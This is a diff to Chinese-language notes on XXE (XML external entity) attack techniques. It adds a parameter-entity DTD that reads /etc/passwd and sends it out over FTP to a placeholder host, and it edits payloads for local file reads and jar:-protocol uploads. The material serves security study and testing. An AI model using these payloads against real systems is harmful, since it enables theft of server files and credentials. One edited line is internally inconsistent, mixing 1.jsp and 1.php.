@@ -157,7 +157,7 @@
 
 * &passwd;将被解析为目标文件的内容，如果我们足够幸运，返回包包含我们发送过去的\<root\>&passwd;\</root\>，那么我们将会直接得到想要的文件内容
 
-##### DOS攻击
+##### DOS攻击(部分解析器)
 
 ```xml
 <!--?xml version="1.0" ?-->
@@ -210,7 +210,7 @@
   * 提取出指定文件
   * 删除临时文件
 * 上传文件有两个关键问题
-  * 如何知道上传文件名：通过报错形式jar:http://localhost:9999/jar.zip!/1.php，如果1.php不在jar.zip包里，可以通过报错获取文件路径；接下来要获取文件名可能要通过其他漏洞或者根据具体的命名规则爆破
+  * 如何知道上传文件名：通过报错形式jar:http://localhost:9999/jar.zip!/1.jsp，如果1.php不在jar.zip包里，可以通过报错获取文件路径；接下来要获取文件名可能要通过其他漏洞或者根据具体的命名规则爆破
   * 如何延长临时文件留存时间：
     * 通过延长文件传输时间：
     * 竞争条件等
@@ -274,7 +274,7 @@
 ```xml
 <!DOCTYPE root [
     <!ENTITY % start "<![CDATA[">
-    <!ENTITY % xxe SYSTEM "想要包含的文件">
+    <!ENTITY % xxe SYSTEM "file:\\\d:\test.txt">
     <!ENTITY % end "]]>">
     <!ENTITY % dtd SYSTEM "DTD url">
 ]>
@@ -310,3 +310,29 @@
 * 对%：使用\&#37;替代
 
 * 对&
+
+#### 通过ftp外带
+
+```xml
+<!DOCTYPE root SYSTEM "dtd url">
+<root>&send;</root>
+```
+
+```dtd
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % evil "%start;%xxe;%end;">
+<!ENTITY % dtd "<!ENTITY send SYSTEM 'ftp://xxx/%evil;'>">
+%dtd;
+```
+
+#### 高jdk版本(TODO)
+
+##### O2OA报错回显
+
+### 补充
+
+#### XInclude XXE
+
+#### 疑难杂症
